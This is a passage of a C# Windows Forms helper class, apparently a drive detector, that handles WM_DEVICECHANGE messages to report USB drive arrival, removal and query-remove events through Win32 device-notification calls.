            /// Garbage collector will call this method.
            /// </summary>
            public void Dispose()
            {
                RegisterForDeviceChange(false, null);
            }


            #region WindowProc
            /// <summary>
            /// Message handler which must be called from client form.
            /// Processes Windows messages and calls event handlers. 
            /// </summary>
            /// <param name="m"></param>
            public void WndProc(ref Message m)
            {
                int devType;
                char c;

                if (m.Msg == WM_DEVICECHANGE)
                {
                    // WM_DEVICECHANGE can have several meanings depending on the WParam value...
                    switch (m.WParam.ToInt32())
                    {

                        //
                        // New device has just arrived
                        //
                        case DBT_DEVICEARRIVAL:

                            devType = Marshal.ReadInt32(m.LParam, 4);
                            if (devType == DBT_DEVTYP_VOLUME)
                            {
                                DEV_BROADCAST_VOLUME vol;
                                vol = (DEV_BROADCAST_VOLUME)
                                    Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_VOLUME));

                                // Get the drive letter 
                                c = DriveMaskToLetter(vol.dbcv_unitmask);


                                //
                                // Call the client event handler
                                //
                                // We should create copy of the event before testing it and
                                // calling the delegate - if any
                                DriveDetectorEventHandler tempDeviceArrived = DeviceArrived;
                                if (tempDeviceArrived != null)
                                {
                                    DriveDetectorEventArgs e = new DriveDetectorEventArgs();
                                    e.Drive = c + ":\\";
                                    tempDeviceArrived(this, e);

                                    // Register for query remove if requested
                                    if (e.HookQueryRemove)
                                    {
                                        // If something is already hooked, unhook it now
                                        if (mDeviceNotifyHandle != IntPtr.Zero)
                                        {
                                            RegisterForDeviceChange(false, null);
                                        }

                                        RegisterQuery(c + ":\\");
                                    }
                                }     // if  has event handler


                            }
                            break;



                        //
                        // Device is about to be removed
                        // Any application can cancel the removal
                        //
                        case DBT_DEVICEQUERYREMOVE:

                            devType = Marshal.ReadInt32(m.LParam, 4);
                            if (devType == DBT_DEVTYP_HANDLE)
                            {
                                // TODO: we could get the handle for which this message is sent 
                                // from vol.dbch_handle and compare it against a list of handles for 
                                // which we have registered the query remove message (?)                                                 
                                //DEV_BROADCAST_HANDLE vol;
                                //vol = (DEV_BROADCAST_HANDLE)
                                //   Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_HANDLE));
                                // if ( vol.dbch_handle ....


                                //
                                // Call the event handler in client
                                //
                                DriveDetectorEventHandler tempQuery = QueryRemove;
                                if (tempQuery != null)
                                {
                                    DriveDetectorEventArgs e = new DriveDetectorEventArgs();
                                    e.Drive = mCurrentDrive;        // drive which is hooked
                                    tempQuery(this, e);

                                    // If the client wants to cancel, let Windows know
                                    if (e.Cancel)
                                    {
                                        m.Result = (IntPtr)BROADCAST_QUERY_DENY;
                                    }
                                    else
                                    {
                                        // Change 28.10.2007: Unregister the notification, this will
                                        // close the handle to file or root directory also. 
                                        // We have to close it anyway to allow the removal so
                                        // even if some other app cancels the removal we would not know about it...                                    
                                        RegisterForDeviceChange(false, null);   // will also close the mFileOnFlash
                                    }

                                }
                            }
                            break;


                        //
                        // Device has been removed
                        //
                        case DBT_DEVICEREMOVECOMPLETE:

                            devType = Marshal.ReadInt32(m.LParam, 4);
                            if (devType == DBT_DEVTYP_VOLUME)
                            {
                                devType = Marshal.ReadInt32(m.LParam, 4);
                                if (devType == DBT_DEVTYP_VOLUME)
                                {
                                    DEV_BROADCAST_VOLUME vol;
                                    vol = (DEV_BROADCAST_VOLUME)
                                        Marshal.PtrToStructure(m.LParam, typeof(DEV_BROADCAST_VOLUME));
                                    c = DriveMaskToLetter(vol.dbcv_unitmask);

                                    //
                                    // Call the client event handler
                                    //
                                    DriveDetectorEventHandler tempDeviceRemoved = DeviceRemoved;
                                    if (tempDeviceRemoved != null)
                                    {
                                        DriveDetectorEventArgs e = new DriveDetectorEventArgs();
                                        e.Drive = c + ":\\";
                                        tempDeviceRemoved(this, e);
                                    }

                                    // TODO: we could unregister the notify handle here if we knew it is the
                                    // right drive which has been just removed
                                    //RegisterForDeviceChange(false, null);
                                }
                            }
                            break;
                    }

                }

            }
            #endregion



            #region  Private Area

            /// <summary>
            /// New: 28.10.2007 - handle to root directory of flash drive which is opened
            /// for device notification
            /// </summary>
            private IntPtr mDirHandle = IntPtr.Zero;

            /// <summary>
            /// Class which contains also handle to the file opened on the flash drive
            /// </summary>
            private FileStream mFileOnFlash = null;

            /// <summary>
            /// Name of the file to try to open on the removable drive for query remove registration
            /// </summary>
            private string mFileToOpen;

            /// <summary>
            /// Handle to file which we keep opened on the drive if query remove message is required by the client
            /// </summary>       
            private IntPtr mDeviceNotifyHandle;

            /// <summary>
            /// Handle of the window which receives messages from Windows. This will be a form.
            /// </summary>
            private IntPtr mRecipientHandle;

            /// <summary>
            /// Drive which is currently hooked for query remove
            /// </summary>
            private string mCurrentDrive;


            // Win32 constants
            private const int DBT_DEVTYP_DEVICEINTERFACE = 5;
            private const int DBT_DEVTYP_HANDLE = 6;
            private const int BROADCAST_QUERY_DENY = 0x424D5144;
            private const int WM_DEVICECHANGE = 0x0219;
            private const int DBT_DEVICEARRIVAL = 0x8000; // system detected a new device
            private const int DBT_DEVICEQUERYREMOVE = 0x8001;   // Preparing to remove (any program can disable the removal)
            private const int DBT_DEVICEREMOVECOMPLETE = 0x8004; // removed 
            private const int DBT_DEVTYP_VOLUME = 0x00000002; // drive type is logical volume

            /// <summary>
            /// Registers for receiving the query remove message for a given drive.
            /// We need to open a handle on that drive and register with this handle. 
            /// Client can specify this file in mFileToOpen or we will open root directory of the drive
            /// </summary>
            /// <param name="drive">drive for which to register. </param>
            private void RegisterQuery(string drive)
            {
                bool register = true;

                if (mFileToOpen == null)
                {
                    // Change 28.10.2007 - Open the root directory if no file specified - leave mFileToOpen null 
                    // If client gave us no file, let's pick one on the drive... 
                    //mFileToOpen = GetAnyFile(drive);
                    //if (mFileToOpen.Length == 0)
                    //    return;     // no file found on the flash drive                
                }
                else
                {
                    // Make sure the path in mFileToOpen contains valid drive
                    // If there is a drive letter in the path, it may be different from the  actual
                    // letter assigned to the drive now. We will cut it off and merge the actual drive 
                    // with the rest of the path.
                    if (mFileToOpen.Contains(":"))
                    {
                        string tmp = mFileToOpen.Substring(3);
                        string root = Path.GetPathRoot(drive);
                        mFileToOpen = Path.Combine(root, tmp);
                    }
                    else
                        mFileToOpen = Path.Combine(drive, mFileToOpen);
                }


                try
                {
                    //mFileOnFlash = new FileStream(mFileToOpen, FileMode.Open);
                    // Change 28.10.2007 - Open the root directory 
                    if (mFileToOpen == null)  // open root directory
                        mFileOnFlash = null;
                    else
                        mFileOnFlash = new FileStream(mFileToOpen, FileMode.Open);
                }
                catch (Exception)
                {
                    // just do not register if the file could not be opened
                    register = false;
                }


                if (register)
                {
                    //RegisterForDeviceChange(true, mFileOnFlash.SafeFileHandle);
                    //mCurrentDrive = drive;
                    // Change 28.10.2007 - Open the root directory 
                    if (mFileOnFlash == null)
                        RegisterForDeviceChange(drive);
                    else
                        // old version
                        RegisterForDeviceChange(true, mFileOnFlash.SafeFileHandle);

                    mCurrentDrive = drive;
                }


            }


            /// <summary>
            /// New version which gets the handle automatically for specified directory
            /// Only for registering! Unregister with the old version of this function...
            /// </summary>
            /// <param name="register"></param>
            /// <param name="dirPath">e.g. C:\\dir</param>
            private void RegisterForDeviceChange(string dirPath)
            {
                IntPtr handle = Native.OpenDirectory(dirPath);
                if (handle == IntPtr.Zero)
                {
                    mDeviceNotifyHandle = IntPtr.Zero;
                    return;
                }
                else
                    mDirHandle = handle;    // save handle for closing it when unregistering

                // Register for handle
                DEV_BROADCAST_HANDLE data = new DEV_BROADCAST_HANDLE();
                data.dbch_devicetype = DBT_DEVTYP_HANDLE;
                data.dbch_reserved = 0;
                data.dbch_nameoffset = 0;
                //data.dbch_data = null;
                //data.dbch_eventguid = 0;
                data.dbch_handle = handle;
                data.dbch_hdevnotify = (IntPtr)0;
                int size = Marshal.SizeOf(data);
                data.dbch_size = size;
                IntPtr buffer = Marshal.AllocHGlobal(size);
                Marshal.StructureToPtr(data, buffer, true);

                mDeviceNotifyHandle = Native.RegisterDeviceNotification(mRecipientHandle, buffer, 0);

            }

            /// <summary>
            /// Registers to be notified when the volume is about to be removed
            /// This is requierd if you want to get the QUERY REMOVE messages
            /// </summary>
            /// <param name="register">true to register, false to unregister</param>
            /// <param name="fileHandle">handle of a file opened on the removable drive</param>
            private void RegisterForDeviceChange(bool register, SafeFileHandle fileHandle)
            {
                if (register)
                {
                    // Register for handle
                    DEV_BROADCAST_HANDLE data = new DEV_BROADCAST_HANDLE();
                    data.dbch_devicetype = DBT_DEVTYP_HANDLE;
                    data.dbch_reserved = 0;
                    data.dbch_nameoffset = 0;
                    //data.dbch_data = null;
                    //data.dbch_eventguid = 0;
                    data.dbch_handle = fileHandle.DangerousGetHandle(); //Marshal. fileHandle; 
                    data.dbch_hdevnotify = (IntPtr)0;
                    int size = Marshal.SizeOf(data);
                    data.dbch_size = size;
                    IntPtr buffer = Marshal.AllocHGlobal(size);
                    Marshal.StructureToPtr(data, buffer, true);

                    mDeviceNotifyHandle = Native.RegisterDeviceNotification(mRecipientHandle, buffer, 0);
                }
                else
                {
                    // close the directory handle
                    if (mDirHandle != IntPtr.Zero)
                    {
                        Native.CloseDirectoryHandle(mDirHandle);
                        //    string er = Marshal.GetLastWin32Error().ToString();
                    }

                    // unregister
                    if (mDeviceNotifyHandle != IntPtr.Zero)
                    {
                        Native.UnregisterDeviceNotification(mDeviceNotifyHandle);
                    }


                    mDeviceNotifyHandle = IntPtr.Zero;
                    mDirHandle = IntPtr.Zero;

                    mCurrentDrive = "";
                    if (mFileOnFlash != null)
                    {
                        mFileOnFlash.Close();
                        mFileOnFlash = null;
                    }
                }

            }

            /// <summary>
            /// Gets drive letter from a bit mask where bit 0 = A, bit 1 = B etc.
            /// There can actually be more than one drive in the mask but we 
            /// just use the last one in this case.
            /// </summary>
            /// <param name="mask"></param>
            /// <returns></returns>
            private static char DriveMaskToLetter(int mask)
            {
                char letter;
                string drives = "ABCDEFGHIJKLMNOPQRSTUVWXYZ";
                // 1 = A
                // 2 = B
                // 4 = C...
                int cnt = 0;
                int pom = mask / 2;
                while (pom != 0)
                {
                    // while there is any bit set in the mask
                    // shift it to the righ...                
                    pom = pom / 2;
                    cnt++;
                }

                if (cnt < drives.Length)
                    letter = drives[cnt];
                else
                    letter = '?';

                return letter;
            }

            /* 28.10.2007 - no longer needed
            /// <summary>
            /// Searches for any file in a given path and returns its full path
            /// </summary>
            /// <param name="drive">drive to search</param>
            /// <returns>path of the file or empty string</returns>
            private string GetAnyFile(string drive)
            {
                string file = "";
                // First try files in the root
                string[] files = Directory.GetFiles(drive);
                if (files.Length == 0)
                {
                    // if no file in the root, search whole drive
                    files = Directory.GetFiles(drive, "*.*", SearchOption.AllDirectories);
                }

                if (files.Length > 0)
                    file = files[0];        // get the first file

                // return empty string if no file found
                return file;
            }*/
            #endregion


            #region Native Win32 API
            /// <summary>
            /// WinAPI functions
            /// </summary>        
            private class Native
            {
                //   HDEVNOTIFY RegisterDeviceNotification(HANDLE hRecipient,LPVOID NotificationFilter,DWORD Flags);
                [DllImport("user32.dll", CharSet = CharSet.Auto)]
                public static extern IntPtr RegisterDeviceNotification(IntPtr hRecipient, IntPtr NotificationFilter, uint Flags);

                [DllImport("user32.dll", CharSet = CharSet.Auto)]
                public static extern uint UnregisterDeviceNotification(IntPtr hHandle);

                //
                // CreateFile  - MSDN
                const uint GENERIC_READ = 0x80000000;
                const uint OPEN_EXISTING = 3;
                const uint FILE_SHARE_READ = 0x00000001;
                const uint FILE_SHARE_WRITE = 0x00000002;
                const uint FILE_ATTRIBUTE_NORMAL = 128;
                const uint FILE_FLAG_BACKUP_SEMANTICS = 0x02000000;
                static readonly IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);


                // should be "static extern unsafe"
                [DllImport("kernel32", SetLastError = true)]
                static extern IntPtr CreateFile(
                      string FileName,                    // file name
                      uint DesiredAccess,                 // access mode
                      uint ShareMode,                     // share mode
                      uint SecurityAttributes,            // Security Attributes
                      uint CreationDisposition,           // how to create
                      uint FlagsAndAttributes,            // file attributes
                      int hTemplateFile                   // handle to template file
                      );


                [DllImport("kernel32", SetLastError = true)]
                static extern bool CloseHandle(
                      IntPtr hObject   // handle to object
                      );

                /// <summary>
                /// Opens a directory, returns it's handle or zero.
                /// </summary>
                /// <param name="dirPath">path to the directory, e.g. "C:\\dir"</param>
                /// <returns>handle to the directory. Close it with CloseHandle().</returns>
                static public IntPtr OpenDirectory(string dirPath)
                {
                    // open the existing file for reading          
                    IntPtr handle = CreateFile(
                          dirPath,
                          GENERIC_READ,
                          FILE_SHARE_READ | FILE_SHARE_WRITE,
                          0,
                          OPEN_EXISTING,
                          FILE_FLAG_BACKUP_SEMANTICS | FILE_ATTRIBUTE_NORMAL,
                          0);

                    if (handle == INVALID_HANDLE_VALUE)
                        return IntPtr.Zero;
                    else
                        return handle;
                }


                public static bool CloseDirectoryHandle(IntPtr handle)
                {
                    return CloseHandle(handle);
                }
            }


            // Structure with information for RegisterDeviceNotification.
            [StructLayout(LayoutKind.Sequential)]
            public struct DEV_BROADCAST_HANDLE
            {
                public int dbch_size;
                public int dbch_devicetype;
                public int dbch_reserved;
                public IntPtr dbch_handle;
                public IntPtr dbch_hdevnotify;
                public Guid dbch_eventguid;
                public long dbch_nameoffset;
                //public byte[] dbch_data[1]; // = new byte[1];
                public byte dbch_data;
                public byte dbch_data1;
            }

            // Struct for parameters of the WM_DEVICECHANGE message
            [StructLayout(LayoutKind.Sequential)]
            public struct DEV_BROADCAST_VOLUME
            {
                public int dbcv_size;
                public int dbcv_devicetype;
                public int dbcv_reserved;
                public int dbcv_unitmask;
            }
            #endregion

        }

    #endregion

}
